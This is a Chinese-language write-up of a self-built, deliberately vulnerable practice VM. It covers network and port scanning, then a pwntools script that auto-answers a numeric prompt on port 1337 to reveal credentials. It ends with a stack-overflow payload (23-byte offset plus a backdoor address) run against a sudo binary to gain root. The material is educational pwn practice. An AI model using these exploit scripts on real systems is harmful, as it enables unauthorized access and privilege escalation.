---
title: Self-VM Tools复盘
author: LingMj
data: 2025-06-15
categories: [Self-VM]
tags: [upload]
description: 难度-Low
---

## 网段扫描

```                   
root@LingMj:~/xxoo# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:27:55, IPv4: 192.168.137.190
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.137.1	3e:21:9c:12:bd:a3	(Unknown: locally administered)
192.168.137.202	a0:78:17:62:e5:0a	Apple, Inc.
192.168.137.210	3e:21:9c:12:bd:a3	(Unknown: locally administered)

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.062 seconds (124.15 hosts/sec). 3 responded
```

## 端口扫描

```
root@LingMj:~/xxoo# nmap -p- -sC -sV 192.168.137.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 11:07 EDT
Nmap scan report for Tools.mshome.net (192.168.137.210)
Host is up (0.027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     Please input [240]: Error: Incorrect input! Connection closed.
|   DNSVersionBindReqTCP: 
|     Please input [342]: Error: Incorrect input! Connection closed.
|   FourOhFourRequest: 
|     Please input [299]: Error: Incorrect input! Connection closed.
|   GenericLines: 
|     Please input [768]: Error: Incorrect input! Connection closed.
|   GetRequest: 
|     Please input [905]: Error: Incorrect input! Connection closed.
|   HTTPOptions: 
|     Please input [696]: Error: Incorrect input! Connection closed.
|   Help: 
|     Please input [413]: Error: Incorrect input! Connection closed.
|   Kerberos: 
|     Please input [998]: Error: Incorrect input! Connection closed.
|   LDAPBindReq: 
|     Please input [218]: Error: Incorrect input! Connection closed.
|   LDAPSearchReq: 
|     Please input [356]: Error: Incorrect input! Connection closed.
|   LPDString: 
|     Please input [178]: Error: Incorrect input! Connection closed.
|   NULL: 
|     Please input [768]:
|   RPCCheck: 
|     Please input [784]: Error: Incorrect input! Connection closed.
|   RTSPRequest: 
|     Please input [792]: Error: Incorrect input! Connection closed.
|   SMBProgNeg: 
|     Please input [889]: Error: Incorrect input! Connection closed.
|   SSLSessionReq: 
|     Please input [102]: Error: Incorrect input! Connection closed.
|   TLSSessionReq: 
|     Please input [296]: Error: Incorrect input! Connection closed.
|   TerminalServerCookie: 
|     Please input [695]: Error: Incorrect input! Connection closed.
|   X11Probe: 
|_    Please input [152]: Error: Incorrect input! Connection closed.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.95%I=7%D=6/15%Time=684EE1CA%P=aarch64-unknown-linux-gn
SF:u%r(NULL,14,"Please\x20input\x20\[768\]:\x20")%r(GenericLines,3F,"Pleas
SF:e\x20input\x20\[768\]:\x20Error:\x20Incorrect\x20input!\x20Connection\x
SF:20closed\.\n")%r(GetRequest,3F,"Please\x20input\x20\[905\]:\x20Error:\x
SF:20Incorrect\x20input!\x20Connection\x20closed\.\n")%r(HTTPOptions,3F,"P
SF:lease\x20input\x20\[696\]:\x20Error:\x20Incorrect\x20input!\x20Connecti
SF:on\x20closed\.\n")%r(RTSPRequest,3F,"Please\x20input\x20\[792\]:\x20Err
SF:or:\x20Incorrect\x20input!\x20Connection\x20closed\.\n")%r(RPCCheck,3F,
SF:"Please\x20input\x20\[784\]:\x20Error:\x20Incorrect\x20input!\x20Connec
SF:tion\x20closed\.\n")%r(DNSVersionBindReqTCP,3F,"Please\x20input\x20\[34
SF:2\]:\x20Error:\x20Incorrect\x20input!\x20Connection\x20closed\.\n")%r(D
SF:NSStatusRequestTCP,3F,"Please\x20input\x20\[240\]:\x20Error:\x20Incorre
SF:ct\x20input!\x20Connection\x20closed\.\n")%r(Help,3F,"Please\x20input\x
SF:20\[413\]:\x20Error:\x20Incorrect\x20input!\x20Connection\x20closed\.\n
SF:")%r(SSLSessionReq,3F,"Please\x20input\x20\[102\]:\x20Error:\x20Incorre
SF:ct\x20input!\x20Connection\x20closed\.\n")%r(TerminalServerCookie,3F,"P
SF:lease\x20input\x20\[695\]:\x20Error:\x20Incorrect\x20input!\x20Connecti
SF:on\x20closed\.\n")%r(TLSSessionReq,3F,"Please\x20input\x20\[296\]:\x20E
SF:rror:\x20Incorrect\x20input!\x20Connection\x20closed\.\n")%r(Kerberos,3
SF:F,"Please\x20input\x20\[998\]:\x20Error:\x20Incorrect\x20input!\x20Conn
SF:ection\x20closed\.\n")%r(SMBProgNeg,3F,"Please\x20input\x20\[889\]:\x20
SF:Error:\x20Incorrect\x20input!\x20Connection\x20closed\.\n")%r(X11Probe,
SF:3F,"Please\x20input\x20\[152\]:\x20Error:\x20Incorrect\x20input!\x20Con
SF:nection\x20closed\.\n")%r(FourOhFourRequest,3F,"Please\x20input\x20\[29
SF:9\]:\x20Error:\x20Incorrect\x20input!\x20Connection\x20closed\.\n")%r(L
SF:PDString,3F,"Please\x20input\x20\[178\]:\x20Error:\x20Incorrect\x20inpu
SF:t!\x20Connection\x20closed\.\n")%r(LDAPSearchReq,3F,"Please\x20input\x2
SF:0\[356\]:\x20Error:\x20Incorrect\x20input!\x20Connection\x20closed\.\n"
SF:)%r(LDAPBindReq,3F,"Please\x20input\x20\[218\]:\x20Error:\x20Incorrect\
SF:x20input!\x20Connection\x20closed\.\n");
MAC Address: 3E:21:9C:12:BD:A3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.80 seconds
```

## 获取webshell

![picture 0](../assets/images/2a4f98ad974704ba044f09a2350276e043a7bcecf335cbc23da4bee79f9edc36.png)  

>这个靶机是促进大家学pwn的，我这个博客好像没有pwn的操作导致我每次都要去翻群主视频，所以必须出一个巩固流程
>

![picture 1](../assets/images/474f91379caa8bd1fac95735f0c757003ee1615cdfbea636c85d68f06c57e4a1.png)  

>可以看的需要不断的输入回现，我有想过是输入多少次直接返回密码，然后问了gtp，很明显gtp是大傻子给不了我答案🤔，所以我打算自己写一个，当然测试这个被我跳过了因为写的时间太长
>
>学习写的地址也是有的：https://pwntools-docs-zh.readthedocs.io/zh-cn/dev/，记得安装pwntools
>

```
root@LingMj:~/xxoo# python3 exp1.py
[+] Opening connection to 192.168.137.210 on port 1337: Done
725
[*] Switching to interactive mode
 $ 
[*] Interrupted
[*] Closed connection to 192.168.137.210 port 1337
                                                                                                                                                                                                        
root@LingMj:~/xxoo# cat exp1.py 
from pwn import *
import re

p = remote("192.168.137.210", "1337")

a = p.recvuntil(b':').decode()
pattern = r'-?\d+'
value = re.findall(pattern, a)
print(value[0])
p.interactive()
```

>用一下python正则去处理这个数字出来，接下来就是循环去填写
>

![picture 2](../assets/images/786416224721395e72250dee4264790a66b35a68873b438a8e34329798d40927.png)  

```
from pwn import *
import re

p = remote("192.168.137.210", "1337")

for i in range(100):
	a = p.recvuntil(b':').decode()
	print(a)
	pattern = r'-?\d+'
	value = re.findall(pattern, a)
	print(value[0])
	p.send(value[0])
p.interactive()
```

>可以看的我已经成功将它自动填写了，但是100好像不够，具体是250，需要测量
>

![picture 3](../assets/images/c30da8c023e1a5d7bf0796ffda7af62d3a4654065bff231e963e42c8505ea40c.png)  

>跑完刚好出现账号和密码
>

## 提权

![picture 4](../assets/images/d061f0e67b8393bd790dcfa895a031f40ebdd0cc8dd0b4c4dee2d88f991d9ce3.png)  

>妥妥pwn题，先测偏移量，这个我也研究够呛
>

![picture 5](../assets/images/1359a6fea5230848da59fa601ef69c47221d7946c60a6385b8e0f96372dff993.png)  

>典型运行，输入栈溢出，新手的话可以看：https://blog.csdn.net/qq_41988448/article/details/103755773
>

![picture 6](../assets/images/6b0d2f68e76febecd19cfda934073531b40dc02c5124404d2bd77847ebb7d08b.png)  

>我当时卡住着怎么断错误，不过不影响查找奥
>

![picture 7](../assets/images/3ed8e18a860bd04d209fbc50ab9b2e63e186146735b9a6fa02d2d9e6d5e5f399.png)  

>先看这个rip
>

![picture 8](../assets/images/ec6bf23051bf250788ee62173e245ea53a9bfdc558aef208187e804ba1cbeab1.png)  

>可以看的存在后门
>

![picture 9](../assets/images/86cd84d3a9fae9ec81f7dcf0b2b624421cdee917ca10450b1575e887184bfe70.png)  

>接着看rsp找到溢出地址
>

![picture 10](../assets/images/5188c5d9297b39e8b4e1b893a105c01fd5c342b4763765b5188092010188f52a.png)  

>可以看的偏移量是23
>

![picture 11](../assets/images/333bc93e341281d8d0782e9f418f94f4f18c803f7503c5d78b27f0f67ba6f7fc.png)  

>接着找到后门地址直接构建payload
>

```
from pwn import *

context(arch='amd64', os='linux')

p = process(["sudo", "/opt/find_backdoor"])

payload = b'A' * 23 + p64(0x0000000000401186)
p.send(payload)
p.interactive()
```

![picture 12](../assets/images/8b2bb1355fd8e6cd71e8f80a7ee25e49d19f12a59811cbbdebb4fa21d2a54560.png)  

>挺简单的，算是pwn非常入门，而且留有pwntools和pwndbg对新手友好，可以冲冲冲！！！
>

>userflag:
>
>rootflag:
>
